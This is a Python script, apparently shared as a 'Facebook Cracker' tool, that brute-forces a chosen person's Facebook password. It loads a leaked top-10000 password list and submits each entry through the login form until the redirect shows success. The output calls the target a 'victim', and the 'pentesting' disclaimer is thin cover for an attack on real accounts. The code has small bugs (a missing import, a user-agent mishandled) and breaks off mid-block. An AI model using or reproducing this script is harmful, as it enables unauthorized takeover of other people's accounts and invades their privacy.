#!/usr/bin/python3
import sys
import random
import mechanize
import http.cookiejar

GHT = '''
        +=========================================+
        |..........Facebook Cracker v 2...........|
        +-----------------------------------------+
        |#Author: InfoSecHacker                    |
        |#Contact: www.twitter.com/abhishekmani002|
        |#Date: 23/10/2015                        |
        |#This tool is made for pentesting.       |
        |#Changing the Description of this tool   |
        |Won't make you the coder ^_^ !!!         |
        |#Respect Coderz ^_^                      |
        |#I take no responsibilities for the      |
        |  use of this program !                  |
        +=========================================+
        |..........Facebook Cracker v 2...........|
        +-----------------------------------------+
'''

print("Note: - This tool can crack Facebook accounts even if you don't have the email of your victim")
print("# Hit CTRL+C to quit the program")
print("# Use www.graph.facebook.com for more infos about your victim ^_^")

email = input("[+] Enter Email, Phone Number or ID: ")

# Try to get the absolute path of the script's directory
script_dir = os.path.dirname(os.path.abspath(__file__))
passwordlist = os.path.join(script_dir, "darkweb2017-top10000.txt")

useragents = [
    ('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')
]
login = 'https://www.facebook.com/login.php?login_attempt=1&lwv=100'


def attack(password):
    try:
        sys.stdout.write("\r[*] trying %s.. " % password)
        sys.stdout.flush()
        br.addheaders = [
            ('User-agent', random.choice(useragents)),
            ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'),
            ('Accept-Encoding', 'gzip, deflate, lzma, sdch'),
            ('Accept-Language', 'en-US,en;q=0.8'),
            ('Cache-Control', 'max-age=0'),
            ('Connection', 'keep-alive'),
            ('Host', 'www.facebook.com'),
            ('Referer', 'https://www.facebook.com'),
            ('Upgrade-Insecure-Requests', '1')
        ]
        site = br.open(login)
        br.select_form(nr=0)

        # Facebook
        br.form['email'] = email
        br.form['pass'] = password
        br.submit()
        log = br.geturl()
        if log != login:
            print("\n===========================")
            print("[*] Password found .. !!")
            print("[*] Password : %s" % (password))
            print("===========================")
            sys.exit(1)
    except KeyboardInterrupt:
        print("\n[*] Exiting program .. ")
        sys.exit(1)


def search():
    global password
    for password in passwords:
        attack(password.replace("\n", ""))


def check():
    global br
    global passwords
    try:
        br = mechanize.Browser()
        cj = http.cookiejar.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
        print("\n[*] Exiting program ..\n")
        sys.exit(1)
    try:
        with open(passwordlist, "r") as file:
            passwords = file.readlines()
            k = 0
            while k < len(passwords):
                passwords[k] = passwords[k].strip()
                k += 1
    except IOError:
        print("\n [*] Error: check your password list path \n")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n [*] Exiting program ..\n")
        sys.exit(1)
    try:
        print(GHT)
        print("[*] Account to crack : %s" % (email))
        print("[*] Loaded :", len(passwords), "passwords")
        print("[*] Cracking, please wait ...")
    except KeyboardInterrupt:
        print("\n [*] Exiting program ..\n")
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
       
